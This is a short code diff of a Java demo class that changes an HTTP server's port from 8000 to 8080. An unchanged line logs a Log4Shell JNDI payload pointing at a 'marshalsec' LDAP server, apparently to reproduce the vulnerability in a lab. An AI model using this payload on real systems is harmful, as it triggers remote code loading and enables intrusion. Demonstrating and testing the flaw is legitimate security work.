@@ -38,11 +38,11 @@ public class log4j {
 
     public static void main(String[] args) throws IOException {
         logger.error("${jndi:ldap://marshalsec:1389/Exploit}");
-        HttpServer server = HttpServer.create(new InetSocketAddress(8000), 0);
+        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);
         server.createContext("/", new RootHandler());
         server.setExecutor(null); // creates a default executor
 
-        System.out.println("Starting HTTP server on port 8000");
+        System.out.println("Starting HTTP server on port 8080");
         server.start();
     }
 }
